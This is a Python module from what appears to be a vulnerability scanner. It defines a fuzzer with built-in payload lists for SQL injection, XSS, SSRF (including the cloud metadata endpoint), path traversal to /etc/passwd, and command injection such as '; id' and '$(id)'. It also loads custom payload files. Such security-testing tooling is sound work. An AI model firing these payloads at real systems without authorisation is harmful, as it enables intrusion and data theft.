"""Fuzzer -- manages and selects payloads for active testing."""

from __future__ import annotations

from pathlib import Path

from sufa.core.utils.logging import get_logger

logger = get_logger(__name__)

PAYLOAD_DIR = Path(__file__).parent.parent.parent.parent / "payloads"

BUILTIN_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1",
        "1' OR '1'='1'--",
        "1 UNION SELECT NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0.0.0.0",
    ],
    "idor": [
        "1",
        "2",
        "0",
        "-1",
        "999999",
    ],
    "lfi": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "cmdi": [
        "; id",
        "| id",
        "$(id)",
        "`id`",
        "& ping -c 3 127.0.0.1 &",
    ],
}


class Fuzzer:
    """Load and manage payloads for active vulnerability testing."""

    def __init__(self, payload_dir: Path | None = None) -> None:
        self._payloads: dict[str, list[str]] = dict(BUILTIN_PAYLOADS)
        self._load_custom(payload_dir or PAYLOAD_DIR)

    def _load_custom(self, directory: Path) -> None:
        if not directory.exists():
            return
        for f in directory.iterdir():
            if f.suffix == ".txt":
                vuln_type = f.stem.lower()
                try:
                    lines = [
                        line.strip()
                        for line in f.read_text().splitlines()
                        if line.strip() and not line.startswith("#")
                    ]
                    if lines:
                        self._payloads[vuln_type] = lines
                        logger.debug("payloads_loaded", type=vuln_type, count=len(lines))
                except Exception:
                    pass

    def get_payloads(self, vuln_type: str, limit: int = 10) -> list[str]:
        payloads = self._payloads.get(vuln_type.lower(), [])
        return payloads[:limit]

    def get_all_types(self) -> list[str]:
        return sorted(self._payloads.keys())

    def add_payload(self, vuln_type: str, payload: str) -> None:
        if vuln_type not in self._payloads:
            self._payloads[vuln_type] = []
        self._payloads[vuln_type].append(payload)
